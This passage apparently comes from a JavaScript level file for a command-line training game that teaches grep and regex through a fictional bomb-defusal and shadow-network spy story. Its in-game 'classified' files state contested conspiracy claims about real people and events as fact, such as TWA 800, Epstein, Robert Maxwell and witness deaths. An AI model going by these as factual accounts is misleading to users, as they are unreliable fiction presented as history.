  - Pre-2008 crisis: Consortium-linked funds profited $2.7B
  - Pre-COVID lockdowns: Consortium funds liquidated 2 weeks early

ASSESSMENT:
The Consortium has advance knowledge of market-moving events.
Either they cause them, or they have penetration at the
highest levels of government decision-making.

Possibly both.

RECOMMENDED ACTION:
  [REDACTED] - Treasury declined
  [REDACTED] - SEC declined
  [REDACTED] - DOJ declined

The trades will stand. The profits will be made.
Someone decided this is how it works.`
                },

                // ─────────────────────────────────────────────────────────
                // /blacksite/subjects - Person Dossiers
                // ─────────────────────────────────────────────────────────

                '/blacksite/subjects': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['RAVEN.dossier', 'consortium-members', 'assets', 'watchlist.txt']
                },

                '/blacksite/subjects/RAVEN.dossier': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `SUBJECT DOSSIER
═══════════════════════════════════════════════════════════════
CODENAME: RAVEN
REAL NAME: James Robert Raven
DOB: 1983-07-14 | NATION: US Citizen (naturalized 2001)
STATUS: ACTIVE HOSTILE | PRIORITY: ALPHA

BACKGROUND:
  - Born: Pristina, Kosovo (then Yugoslavia)
  - Family: Killed in 1999 NATO bombing (misdirected strike)
  - Immigrated: US, 2001 (refugee status)
  - Education: MIT, Electrical Engineering (2005)
  - Military: US Army EOD, 2006-2012, Dishonorably discharged
    (Incident: [CLASSIFIED] - involved civilian casualties)

PSYCHOLOGICAL PROFILE:
  - Deep-seated anti-establishment ideology
  - Blames US/NATO for family deaths (justified)
  - High intelligence, methodical planning
  - No empathy for "collateral damage"
  - Views himself as balancing scales

CONSORTIUM RECRUITMENT:
  - Contact: 2018 via dark web forums
  - Motivation: Ideology + Payment ($2.5M confirmed)
  - Handler: GRANITE (see Consortium files)
  - Prior operations: 3 confirmed, 2 suspected

CURRENT OPERATION:
  Target: CEO Summit, Meridian Hotel
  Method: IED placement, Room 105
  Status: Device planted, RAVEN extracted

WEAKNESS:
  - Uses predictable patterns (CRIMSON wire protocol)
  - Sentimental about family (photo in device housing)
  - IP addresses used as memory aids (192.168.1.105 = Room 105)

CAPTURE PRIORITY: LOW
NEUTRALIZE PRIORITY: HIGH
If captured, expect no cooperation. Death before dishonor type.`
                },

                '/blacksite/subjects/consortium-members': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['GRANITE.txt', 'OBELISK.txt', 'CIPHER.txt', 'VECTOR.txt', 'council-overview.txt']
                },

                '/blacksite/subjects/consortium-members/council-overview.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `THE CONSORTIUM - COUNCIL OVERVIEW
Classification: TOP SECRET//SAP

The Consortium is not a conspiracy theory. It is a documented
shadow network of financial, intelligence, and corporate interests
that operate above national governments.

STRUCTURE:
  - Inner Council: 4 members (codenames only, identities unknown)
  - Outer Circle: ~40 executives, officials, intelligence veterans
  - Operational Layer: Contractors, assets, useful idiots

COUNCIL MEMBERS:

GRANITE (Council Leader)
  - Suspected: Former CIA DDO or equivalent
  - Controls: Operational planning, asset management
  - Voice analysis: Male, American, educated East Coast

OBELISK (Financial)
  - Suspected: Hedge fund principal or sovereign wealth
  - Controls: Shell companies, market manipulation
  - Voice analysis: Male, British accent, Cambridge educated

CIPHER (Intelligence)
  - Suspected: Active or former Five Eyes senior
  - Controls: Information security, counter-intelligence
  - Voice analysis: Female, American, possibly NSA origin

VECTOR (Technology)
  - Suspected: Tech industry executive or founder
  - Controls: Cyber operations, technical infrastructure
  - Voice analysis: Male, American, Silicon Valley vernacular

KNOWN OPERATIONS:
  - Market manipulation (multiple instances)
  - Political influence (election cycles)
  - Media narrative control
  - Assassination (suspected, 4 cases)
  - MERIDIAN (current)

We know they exist. We've intercepted their communications.
We cannot prove who they are. By design.`
                },

                '/blacksite/subjects/consortium-members/GRANITE.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `CONSORTIUM COUNCIL: GRANITE
Role: Council Leader, Operational Command
Identity: UNCONFIRMED

INTELLIGENCE ASSESSMENT:
GRANITE appears to be the operational commander of the Consortium.
Analysis of intercepted communications suggests:
  - Intelligence community background (CIA, likely DDO)
  - Extensive network of former agency contacts
  - Authorized to sanction lethal operations
  - Personal stake in Consortium beyond financial

VOICE ANALYSIS:
  - Male, estimated age 55-65
  - American accent (Northeast, possibly Boston area)
  - Education: Likely Ivy League
  - Speech patterns: Trained in operational security

OPERATIONAL SIGNATURE:
  - Prefers proxy assets over direct action
  - Never meets in person (always remote)
  - Uses chess terminology ("pawns", "gambits", "endgame")
  - Known to sacrifice assets without hesitation

CANDIDATE PROFILES:
  - [REDACTED] - Former CIA Deputy Director, deceased (official)
  - [REDACTED] - Current [AGENCY] senior, access matches
  - [REDACTED] - Private intelligence contractor, Consortium-linked

GRANITE QUOTE (Intercepted):
"Nations are temporary. Borders are illusions. Power is permanent.
We simply ensure power flows to those who know how to use it."

IF IDENTIFIED:
Do not approach. Do not surveil directly.
GRANITE has demonstrated awareness of monitoring.
Previous identification attempts resulted in asset loss.`
                },

                '/blacksite/subjects/watchlist.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `BLACKSITE WATCHLIST - ACTIVE SUBJECTS
Last Updated: 2024-01-15 02:00 UTC

HIGH PRIORITY (Active Threat):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  RAVEN, James - Current operation, extracted
  [REDACTED] - Consortium technical support
  [REDACTED] - Financial facilitation

MEDIUM PRIORITY (Supporting):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  12 individuals associated with Meridian operation
  Shell company executives (see financial intercepts)
  Local law enforcement assets (compromised)

CONSORTIUM COUNCIL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  GRANITE - Unidentified, HIGH priority
  OBELISK - Unidentified, HIGH priority
  CIPHER - Unidentified, HIGH priority
  VECTOR - Unidentified, HIGH priority

INTERNAL CONCERN:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [REDACTED] - Possible Consortium penetration
  [REDACTED] - Unexplained wealth
  [REDACTED] - Anomalous access patterns

Note: This watchlist is itself watched.
Someone on this list may be reading it now.
Trust no one. Verify everything.`
                },

                // ─────────────────────────────────────────────────────────
                // /blacksite/operations - Mission Files
                // ─────────────────────────────────────────────────────────

                '/blacksite/operations': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['active', 'historical', 'codenames.txt']
                },

                '/blacksite/operations/active': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['MERIDIAN-DEFUSAL.txt', 'CONSORTIUM-TRACE.txt']
                },

                '/blacksite/operations/active/MERIDIAN-DEFUSAL.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `OPERATION: MERIDIAN DEFUSAL
Status: ACTIVE - CRITICAL
Classification: TOP SECRET//BLACKSITE

SITUATION:
IED planted at Meridian Hotel, Room 105. Device confirmed by
thermal imaging. Timer mechanism active - detonation scheduled
to coincide with CEO Summit opening (0845 local, 0745 UTC).

OBJECTIVE:
Provide remote analytical support to field agent PHOENIX.
Analyze security logs, intercepts, and device intelligence
to determine defusal protocol before timer expiration.

TIME REMAINING: CHECK TERMINAL CLOCK

ANALYTICAL TASKS:
  Section 1 (GREP): Pattern hunt - Trace attacker activity
  Section 2 (REGEX): Wire decode - Pattern match protocols
  Section 3 (PIPES): Data synthesis - Build defusal sequence
  BOSS: Final defusal - All skills combined

FIELD ASSET:
  Codename: PHOENIX
  Status: En route to Room 105
  ETA: Already on site, awaiting your analysis
  Capability: EOD trained, requires wire sequence

DEVICE ASSESSMENT:
  Type: Custom IED, moderate yield
  Trigger: Timer primary, anti-tamper secondary
  Wire protocol: CRIMSON (see intercepts)
  Kill radius: 50 meters, structure compromise likely

STAKES:
  47 CEOs (summit attendees)
  ~200 hotel staff
  Unknown guests
  Consortium wins if detonation occurs

This is not a drill. This is not a simulation.
Your analysis determines the outcome.

Get to work.`
                },

                '/blacksite/operations/historical': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['NORTHWOODS.txt', 'MOCKINGBIRD.txt', 'GLADIO.txt', 'COINTELPRO.txt']
                },

                '/blacksite/operations/historical/NORTHWOODS.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `OPERATION NORTHWOODS (Historical Reference)
Classification: DECLASSIFIED (1997)
Date: 1962

SUMMARY:
Joint Chiefs of Staff proposed false flag terrorist attacks
on American soil to justify military invasion of Cuba.

PROPOSED ACTIONS:
  - Blow up US ship in Guantanamo Bay, blame Cuba
  - Sink boat of Cuban refugees, blame Cuba
  - Orchestrate terrorism in US cities, blame Cuba
  - Shoot down civilian airliner, blame Cuba
  - Attack US military base, blame Cuba

APPROVAL STATUS:
  - Joint Chiefs: APPROVED
  - Secretary McNamara: APPROVED
  - President Kennedy: REJECTED

HISTORICAL SIGNIFICANCE:
Northwoods was rejected, but its existence proves:
  - The highest military authorities considered false flags
  - Killing American citizens was deemed acceptable
  - Only Presidential rejection prevented execution
  - The proposals were serious, not hypothetical

ANALYST NOTE:
What Northwoods operations were proposed after 1962?
What proposals were NOT rejected?
What we declassified is what they were willing to reveal.
The filing cabinets are deep.

"The truth is out there. It's just classified."`
                },

                '/blacksite/operations/historical/GLADIO.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `OPERATION GLADIO (Historical Reference)
Classification: DECLASSIFIED (1990)
Duration: 1956-1990 (officially), ongoing (suspected)

SUMMARY:
NATO-coordinated network of secret "stay-behind" armies in
European countries, designed to resist Soviet invasion.
In practice, used for political manipulation and terrorism.

DOCUMENTED ACTIVITIES:
  - Bologna railway bombing (1980) - 85 killed
    Blamed on leftists, executed by Gladio assets

  - Brabant massacres (Belgium, 1982-1985) - 28 killed
    Random supermarket shootings, perpetrators never caught
    Later linked to Gladio network

  - Piazza Fontana bombing (1969) - 17 killed
    Blamed on anarchists, proven to be Gladio/neofascists

STRATEGY OF TENSION:
The explicit goal was to commit terrorism and blame the left,
pushing electorates toward right-wing, pro-NATO governments.

Vincenzo Vinciguerra (convicted Gladio operative):
"You had to attack civilians, the people, women, children,
unknown people far from any political game. The reason was
quite simple: to force the public to turn to the state to
ask for greater security."

MODERN RELEVANCE:
Gladio officially ended in 1990 after Italian PM revealed it.
Similar networks have been documented/suspected:
  - Turkey (Counter-Guerrilla, active)
  - Greece (Sheepskin, suspected active)
  - [REDACTED] (US domestic, suspected)

The strategy of tension did not end. The tactics evolved.`
                },

                '/blacksite/operations/codenames.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `BLACKSITE OPERATION CODENAME REGISTRY

ACTIVE OPERATIONS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  MERIDIAN DEFUSAL - Current priority, counter-terrorism
  CONSORTIUM TRACE - Long-term, Consortium identification
  MOCKINGBIRD REVIVAL - Media monitoring, ongoing
  [REDACTED] - [REDACTED]

COMPLETED OPERATIONS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  CRIMSON THREAD - Consortium financial tracking
  PHANTOM CIRCUIT - Surveillance counter-ops
  SILICON HARVEST - Tech executive monitoring
  MARBLE GARDEN - Attribution reversal

HISTORICAL REFERENCES (Documented):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  NORTHWOODS - Cuba false flag (rejected)
  MOCKINGBIRD - Media infiltration (1950s-1970s)
  GLADIO - European terrorism (1956-1990 official)
  COINTELPRO - Domestic disruption (1956-1971)
  MK-ULTRA - Mind control research (1953-1973)
  CHAOS - Domestic surveillance (1967-1974)
  CONDOR - South American death squads (1968-1989)

NAMING CONVENTION:
  Colors = Surveillance operations
  Minerals = Physical operations
  Animals = Human intelligence
  Weather = Cyber operations
  Celestial = Space/satellite

The names change. The methods persist.`
                },

                // ─────────────────────────────────────────────────────────
                // /blacksite/archives - Cold Cases & Buried Incidents
                // ─────────────────────────────────────────────────────────

                '/blacksite/archives': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['unsolved', 'buried-incidents', 'sanitized-events.txt', 'dead-witnesses.log']
                },

                '/blacksite/archives/unsolved': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['TWA-800.txt', 'building-7.txt', 'vegas-shooter.txt', 'epstein-network.txt']
                },

                '/blacksite/archives/unsolved/TWA-800.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `CASE FILE: TWA FLIGHT 800
Date: July 17, 1996
Official Cause: Center fuel tank explosion
Classification: [DISPUTED]

OFFICIAL NARRATIVE:
Electrical short circuit ignited fuel vapors in center tank.
Mechanical failure. No foul play.

ANOMALIES:

Witness Testimony:
  - 270+ witnesses reported seeing streak of light ascending
  - 96 witnesses described missile-like object
  - FBI conclusion: "Witnesses misinterpreted what they saw"
  - All witness sketches classified

Radar Data:
  - Multiple tracks show objects approaching aircraft
  - P-3 Orion (Navy surveillance) in area at time
  - Radar data gaps during critical moments
  - Raw data never publicly released

Physical Evidence:
  - Residue on seats consistent with missile propellant
  - FBI initially confirmed "explosive residue"
  - Later retracted: "Training exercise contamination"
  - Dog trained for explosives alerted on debris

Investigation:
  - NTSB took 4 years to conclude
  - FBI ended criminal investigation in 16 months
  - Key debris recovered by Navy divers, not NTSB
  - Chain of custody issues documented

ALTERNATE ASSESSMENT:
Navy missile test, accidental shoot-down. Cover-up to protect
military and avoid liability. 230 deaths remain unexplained
to those who examined the evidence.

We may never know. That's the point.`
                },

                '/blacksite/archives/unsolved/epstein-network.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `CASE FILE: EPSTEIN NETWORK
Status: OPEN (Officially closed)
Priority: MAXIMUM SUPPRESSION

SUBJECT: Jeffrey Epstein (deceased 2019)
Official COD: Suicide
Actual COD: [DISPUTED - Evidence contradictory]

THE NETWORK:
Epstein was not a lone predator. He operated a intelligence-linked
blackmail operation with clients at the highest levels of:
  - Government (multiple countries)
  - Finance (Wall Street, international)
  - Technology (Silicon Valley)
  - Royalty (confirmed: Prince Andrew)
  - Entertainment (extensive)

INTELLIGENCE CONNECTIONS:
  - Ghislaine Maxwell's father: Robert Maxwell (Mossad asset, confirmed)
  - Epstein financial backer: Les Wexner (intelligence ties alleged)
  - Epstein "belonged to intelligence" - Alex Acosta (prosecutor)
  - Sweetheart deal (2008): Ordered from "above Acosta's pay grade"

THE CLIENT LIST:
  - Flight logs released (partial) - 70+ names
  - Full logs never released
  - Investigation found "extensive documentation"
  - Zero clients prosecuted

DEATH CIRCUMSTANCES:
  - Cameras malfunctioned
  - Guards sleeping
  - Removed from suicide watch (ordered by whom?)
  - Autopsy: Bones broken consistent with strangulation
  - Pathologist: "More consistent with homicide"
  - Ruling: Suicide

THE COVER-UP:
Someone decided the client list would never be released.
Someone decided no clients would be prosecuted.
Someone decided Epstein would not testify.
Someone was protected.

The most connected predator in modern history.
And we're supposed to believe he acted alone.`
                },

                '/blacksite/archives/sanitized-events.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `SANITIZED EVENTS - HISTORICAL RECORD

The following events have undergone official narrative management.
The public record differs significantly from internal assessments.

EVENT: Gulf of Tonkin Incident (1964)
  Official: North Vietnamese attacked US destroyers
  Actual: Second attack never happened, manufactured justification
  Result: Vietnam War escalation, 58,000 US deaths
  Declassified: 2005

EVENT: Iraqi WMD (2003)
  Official: Intelligence indicated weapons of mass destruction
  Actual: Intelligence was manipulated and fabricated
  Result: Iraq War, $3 trillion, 500,000+ deaths
  Status: Quietly acknowledged, no accountability

EVENT: Syrian Chemical Attack (2018)
  Official: Assad used chemical weapons on Douma
  Actual: OPCW whistleblowers dispute official findings
  Result: US/UK/FR missile strikes
  Status: Whistleblower suppression ongoing

EVENT: [REDACTED] (2001)
  Official: [REDACTED]
  Actual: [REDACTED]
  Result: [REDACTED]
  Status: [REDACTED - 75 YEAR CLASSIFICATION]

Pattern: Manufacture crisis → Public consent → Military action →
        Truth emerges decades later → No consequences

The next manufactured crisis is already in planning.
You won't recognize it until it's too late.
That's how it works. That's how it's always worked.`
                },

                '/blacksite/archives/dead-witnesses.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `BLACKSITE - WITNESS MORTALITY TRACKING
Classification: INTERNAL USE ONLY

The following witnesses to significant events died under
unusual circumstances before testimony could be given:

[JFK Assassination - 1963-1967]
  - 18 material witnesses died within 3 years
  - Actuarial odds: 1 in 100 trillion
  - Causes: Suicide, accident, "heart attack"

[Iran-Contra - 1986-1989]
  - 7 witnesses died before testimony
  - Including: Plane crashes, "suicides"
  - Barry Seal: Shot 6 times, ruled gang hit

[Clinton Era - 1993-2000]
  - [LIST EXCEEDS STATISTICAL PROBABILITY]
  - Pattern: Suicide (2 shots), accident, heart attack (age 30s)

[9/11 Related - 2001-2015]
  - First responders: Elevated cancer rates (documented)
  - Whistleblowers: Multiple premature deaths
  - Journalists: [REDACTED]

[Epstein Network - 2019-Present]
  - Epstein: "Suicide" under impossible circumstances
  - Potential witnesses: Several suspicious deaths
  - Pattern: Investigation momentum dies with witnesses

STATISTICAL NOTE:
These patterns exceed normal mortality by factors of thousands.
Either the universe conspires against inconvenient witnesses,
or someone helps the universe along.

The dead cannot testify.
The living remember that.`
                },

                // ─────────────────────────────────────────────────────────
                // /blacksite/consortium - The Shadow Network
                // ─────────────────────────────────────────────────────────

                '/blacksite/consortium': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'shadow',
                    children: ['README.txt', 'structure.txt', 'shell-companies.log', 'operations-history.txt', 'financial-network.txt']
                },

                '/blacksite/consortium/README.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `THE CONSORTIUM
═══════════════════════════════════════════════════════════════

They don't appear in leaks because they control what gets leaked.
They don't appear in elections because they own both candidates.
They don't appear in media because they own the media.

The Consortium is not a conspiracy theory. It is a documented
network of interests that transcends national boundaries,
political parties, and public institutions.

WHAT WE KNOW:
  - Exists since at least 1971 (documents reference earlier)
  - 4-person council, identities unknown
  - Network of ~40 outer circle members
  - Controls estimated $7+ trillion in assets
  - Active in 89 countries
  - Has penetrated multiple intelligence agencies

WHAT THEY WANT:
  - Controlled instability (profit from chaos)
  - Resource consolidation (post-crisis acquisition)
  - Population management (through economic control)
  - Information control (narrative dominance)

WHAT THEY FEAR:
  - Public awareness of their existence
  - Coordinated exposure
  - Loss of anonymity
  - BLACKSITE

This directory contains everything we've compiled.
It's not enough to stop them. Not yet.
But it's a start.

"The greatest trick the devil ever pulled was convincing
the world he didn't exist." - The Usual Suspects

The Consortium read that line and took notes.`
                },

                '/blacksite/consortium/structure.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `THE CONSORTIUM - ORGANIZATIONAL STRUCTURE

                    ┌─────────────────┐
                    │   THE COUNCIL   │
                    │ GRANITE OBELISK │
                    │  CIPHER VECTOR  │
                    └────────┬────────┘
                             │
          ┌──────────────────┼──────────────────┐
          │                  │                  │
    ┌─────┴─────┐     ┌─────┴─────┐     ┌─────┴─────┐
    │  FINANCE  │     │   INTEL   │     │   TECH    │
    │  Obelisk  │     │   Cipher  │     │  Vector   │
    └─────┬─────┘     └─────┬─────┘     └─────┬─────┘
          │                 │                 │
    Shell Corps       Agency Moles       Platform Access
    Banks             Media Assets       Backdoors
    Funds             Politicians        AI Systems
          │                 │                 │
          └────────────────┬─────────────────┘
                           │
                    ┌──────┴──────┐
                    │ OPERATIONAL │
                    │   Granite   │
                    └──────┬──────┘
                           │
              ┌────────────┼────────────┐
              │            │            │
         Contractors    Assets     Cutouts
         (like RAVEN)  (inside)   (deniable)

DECISION FLOW:
  Council → Strategy
  Outer Circle → Implementation
  Operational → Execution

No single point knows the full picture.
Even council members only know their domain.
Compartmentalization is total.

This structure survived 50+ years of investigation.
It is designed to be impossible to prosecute.
Not illegal - the laws were written to allow it.`
                },

                '/blacksite/consortium/financial-network.txt': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow',
                    content: `CONSORTIUM FINANCIAL NETWORK MAPPING
Classification: TOP SECRET//BLACKSITE

SHELL COMPANY LAYERS (Traced):
Layer 1: 847 registered entities (23 jurisdictions)
Layer 2: 234 holding companies (12 jurisdictions)
Layer 3: 47 investment vehicles (5 jurisdictions)
Layer 4: 8 family offices (3 jurisdictions)
Layer 5: [UNKNOWN - Trail ends]

JURISDICTIONAL HAVENS:
  Delaware (US) - 312 entities
  Cayman Islands - 187 entities
  British Virgin Islands - 156 entities
  Luxembourg - 89 entities
  Singapore - 64 entities
  [Additional jurisdictions redacted]

FINANCIAL INSTITUTIONS (Consortium-linked):
  [MAJOR BANK 1] - Board member in outer circle
  [MAJOR BANK 2] - Consortium client services division
  [MAJOR BANK 3] - Laundering allegations, never prosecuted
  [HEDGE FUND 1] - Founding capital from Consortium
  [PRIVATE EQUITY] - Multiple portfolio connections

ESTIMATED ASSETS UNDER CONTROL:
  Direct ownership: $1.2 trillion
  Indirect control: $4.8 trillion
  Influence/leverage: $7+ trillion

HOW THEY PROFIT:
  - Advance knowledge of market-moving events
  - Short positions before "unexpected" crises
  - Acquisition of distressed assets post-crisis
  - Government contracts through influence
  - Regulatory capture (write the rules, profit from them)

The 2008 financial crisis transferred $7 trillion in wealth.
Most of it went somewhere.
The Consortium knows where.`
                }
            },

            objectives: [
                {
                    id: 1,
                    task: 'Find RAVEN in the auth logs (case-insensitive)',
                    hint: 'Use -i flag: grep -i "raven" auth.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-i') &&
                               cmd.toLowerCase().includes('raven');
                    }
                },
                {
                    id: 2,
                    task: 'Count how many times RAVEN accessed the system',
                    hint: 'Use -c flag: grep -c "RAVEN" auth.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-c') &&
                               cmd.toUpperCase().includes('RAVEN');
                    }
                },
                {
                    id: 3,
                    task: 'Find Room 105 anomalies with line numbers',
                    hint: 'Use -n flag: grep -n "105" keycard.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-n') &&
                               cmd.includes('105');
                    }
                },
                {
                    id: 4,
                    task: 'Find keycard entries that are NOT normal access',
                    hint: 'Use -v to exclude normal: grep -v "Guest" keycard.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-v');
                    }
                },
                {
                    id: 5,
                    task: 'Search all intel files for "RAVEN"',
                    hint: 'Use -r flag: grep -r "RAVEN" /var/log/intel/',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-r');
                    }
                },
                {
                    id: 6,
                    task: 'Get context around CRITICAL security alerts',
                    hint: 'Use -C flag: grep -C 2 "CRITICAL" security_alerts.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && /-(A|B|C)\s*\d/.test(cmd);
                    }
                },
                {
                    id: 7,
                    task: 'List all files mentioning the bomb threat',
                    hint: 'Use -l flag: grep -rl "bomb" /var/log/',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-l');
                    }
                },
                {
                    id: 8,
                    task: 'Find the exact room number in radio intercept',
                    hint: 'Use -w for whole word: grep -w "105" radio_intercept.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-w') &&
                               cmd.includes('105');
                    }
                }
            ],

            // Radio content for The Watcher system
            radio: {
                ghost: [
                    '"...RAVEN left traces in the auth logs..."',
                    '"...192.168.1.105 is the key... the last octet..."',
                    '"...grep for FAILED, grep for RAVEN..."',
                    '"...the room number hides in the IP pattern..."',
                    '"...case sensitivity matters... FAILED not failed..."'
                ],
                security: [
                    '"All floors secure, proceeding with sweep"',
                    '"Guest registry shows unusual check-in pattern"',
                    '"RAVEN was spotted near service entrance"'
                ]
            },

            // Bomb defusal insight phase
            insightPhase: {
                enabled: true,
                question: "You've traced the attacker's origin. The field agent found the hotel registry - which room is the bomb in? The attacker used alias 'admin' - what room did they book?",
                options: [
                    { text: "Room 105 - matches the attacker's IP pattern (192.168.1.105)", correct: true },
                    { text: "Room 522 - matches the port number pattern", correct: false },
                    { text: "Room 234 - matches the failed attempt count", correct: false },
                    { text: "Room 001 - first entry in the log", correct: false }
                ]
            }
        },

        // ──────────────────────────────────────────────────────────
        // GPM-DECODE: BLACKSITE Regex Mission
        // Theme: Decode CRIMSON wire protocol
        // ──────────────────────────────────────────────────────────
        'GPM-DECODE': {
            title: 'DECODE',
            description: 'Use regex to decode the CRIMSON wire protocol patterns.',
            prerequisites: ['GPM-TRACE'],
            tier: null,
            user: 'analyst',
            hostname: 'intelserver',
            startDir: '/data/intel',
            allowedCommands: null,

            filesystem: {
                '/data/intel': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['.signal', 'wire_protocols.db', 'intercepted_codes.log', 'detonator_freq.log', 'crimson_manual.txt', 'bomb_telemetry.log', 'agent_notes.txt']
                },
                '/data/intel/.signal': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst',
                    content: `[GHOST-7 RELAY]
═══════════════════════════════════════════════════

Regex is powerful. But so is knowing when to ask.

    tune 161.7

The wire protocols follow patterns.
CRIMSON has rules. Learn them.

^RED means "starts with RED"
$ means "ends with"
[0-9]{4} means "four digits"

We're watching. We're helping.

    -G`
                },
                '/data/intel/wire_protocols.db': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
                    content: `[BOMB DISPOSAL UNIT - WIRE PROTOCOL DATABASE]
==============================================
PROTOCOL: STANDARD (used by amateurs)
  Pattern: Single color per function
  Disarm: Cut primary power (usually RED)

PROTOCOL: CRIMSON (RAVEN's signature - CONFIRMED IN USE)
  Pattern: Color codes repeat based on trigger mechanism
  Wire sequence encodes timer frequency
  RED = Danger/Active circuit
  BLUE = Ground/Safe when isolated
  GREEN = Secondary trigger - DO NOT CUT FIRST

WIRE COLOR FREQUENCY MAP:
  RED-RED     = Primary detonator (CUT LAST)
  RED-BLUE    = Backup trigger
  BLUE-BLUE   = Ground loop (safe)
  BLUE-GREEN  = Timer circuit
  GREEN-RED   = Anti-tamper (CAUSES DETONATION)
  GREEN-GREEN = Decoy (no function)

CRIMSON DISARM SEQUENCE:
  1. Identify repeated pattern (matches threat frequency)
  2. Cut in order: BLUE-grounds first, then RED-RED last
  3. NEVER cut GREEN-RED combination

[NOTE] RAVEN always uses timestamp as frequency key. Check telemetry.`
                },
                '/data/intel/intercepted_codes.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 3072,
                    content: `[INTERCEPTED CODED TRANSMISSIONS - DECRYPTION REQUIRED]
========================================================
2024-01-15 01:45:22 TX: "RR-RB-BR" (unknown pattern)
2024-01-15 01:45:45 RX: "Confirm CRIMSON active"
2024-01-15 01:46:00 TX: "Package armed. Timer: 02:30:00"
2024-01-15 01:46:15 TX: "Freq: 105-Hz repeat"
2024-01-15 01:47:00 RX: "Wire status?"
2024-01-15 01:47:22 TX: "RED-RED primary. BLUE-BLUE ground. GREEN-RED trap."
2024-01-15 01:48:00 TX: "Anti-tamper armed. Touch GREEN first = boom."
2024-01-15 01:49:00 RX: "Extraction confirmed. Good hunting."
2024-01-15 01:50:00 TX: "Room 105. Meridian. Summit dies at 08:00."
2024-01-15 01:52:00 TX: "Final code: match the frequency, cut the repeat."
2024-01-15 01:53:00 RX: "RAVEN out. Consortium thanks you."

[SIGNAL ANALYSIS]
Transmission source: 192.168.1.105 (confirmed RAVEN)
Pattern detected: Wire colors encoded as two-letter codes
  RR = RED-RED
  RB = RED-BLUE
  BR = BLUE-RED
  BB = BLUE-BLUE
  GR = GREEN-RED (TRAP!)
  GG = GREEN-GREEN

[PRIORITY] Frequency "105-Hz" matches room number. This is the key.`
                },
                '/data/intel/detonator_freq.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
                    content: `[BOMB SQUAD TELEMETRY - DETONATOR FREQUENCY ANALYSIS]
=====================================================
Timestamp       Frequency   Wire_Active    Status
02:30:00        105.0 Hz    RED-RED        ARMED
02:29:55        105.0 Hz    RED-RED        ARMED
02:29:50        105.0 Hz    RED-RED        STABLE
02:29:45        105.0 Hz    RED-RED        STABLE
02:29:40        52.5 Hz     BLUE-BLUE      GROUND_OK
02:29:35        52.5 Hz     BLUE-BLUE      GROUND_OK
02:29:30        105.0 Hz    RED-RED        ARMED
02:29:25        105.0 Hz    RED-RED        ARMED
02:29:20        210.0 Hz    GREEN-RED      TRAP_ACTIVE
02:29:15        52.5 Hz     BLUE-BLUE      GROUND_OK
02:29:10        105.0 Hz    RED-RED        ARMED
02:29:05        105.0 Hz    RED-RED        ARMED

[PATTERN ANALYSIS]
Primary frequency: 105.0 Hz (appears 8 times - DOMINANT)
Ground frequency: 52.5 Hz (half of primary - expected)
Trap frequency: 210.0 Hz (double of primary - GREEN-RED wire)

[CONCLUSION]
The detonator cycles through RED-RED most frequently.
This matches CRIMSON protocol: "cut the repeat"
Disarm wire sequence: RED-RED (the repeated pattern)

[WARNING] GREEN-RED appears once - anti-tamper is ACTIVE`
                },
                '/data/intel/crimson_manual.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
